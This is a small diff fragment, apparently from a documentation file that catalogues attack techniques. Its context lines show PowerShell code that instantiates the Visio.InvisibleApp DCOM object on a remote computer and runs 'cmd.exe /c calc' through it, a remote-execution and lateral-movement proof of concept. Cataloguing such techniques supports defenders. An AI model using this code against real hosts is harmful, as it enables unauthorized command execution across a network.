@@ -18,3 +18,5 @@ updated_at: '2023-04-10T20:26:32.005120+00:00'
 $visio = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Visio.InvisibleApp\", \"$ComputerName\"))
 $visio.Addons.Add(\"C:\\Windows\\System32\\cmd.exe\").Run(\"/c calc\")
 ```
+
+
